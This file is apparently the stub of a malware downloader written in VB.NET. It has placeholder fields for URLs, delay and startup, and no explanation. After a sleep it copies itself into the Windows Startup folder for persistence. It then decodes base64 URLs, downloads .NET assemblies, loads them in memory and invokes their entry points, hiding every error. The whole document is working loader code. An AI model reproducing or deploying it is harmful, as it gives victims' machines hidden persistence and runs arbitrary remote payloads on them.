Public Class Main
    Public Shared URL As String = "%URL%"
    Public Shared Delay As Integer = "%Delay%"
    Public Shared Startup As Boolean = "%Startup%"
    Public Shared EXE As String = Windows.Forms.Application.ExecutablePath
    Public Shared Startup_Folder = Environment.GetFolderPath(7) + "\" + IO.Path.GetFileName(EXE)
    Public Shared SPL As String() = Split(URL, "#,#")




    Public Shared Sub Main()
        Try
            Threading.Thread.Sleep(Delay * 1000)

            If Startup = True AndAlso EXE <> Startup_Folder Then
                IO.File.Delete(Startup_Folder)
                IO.File.Copy(EXE, Startup_Folder)
            End If

            EP()

        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub EP()
        For i As Integer = 0 To SPL.Length - 1
            If SPL(i) <> "" Then
                Try
                    Dim B = AppDomain.CurrentDomain.Load(DW(i))
                    EPI(B)
                    Threading.Thread.Sleep(2500)
                Catch
                End Try
            End If
        Next
    End Sub

    Private Shared Function EPI(b)
        Try
            Return b.EntryPoint.Invoke(Nothing, Nothing)
        Catch ex As Exception
            Return b.EntryPoint.Invoke(Nothing, New Object() {Nothing})
        End Try
    End Function

    Private Shared Function DW(F)
        On Error Resume Next
        Dim WC As Net.WebClient = New Net.WebClient
        Return WC.DownloadData(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(SPL(F))))
    End Function

End Class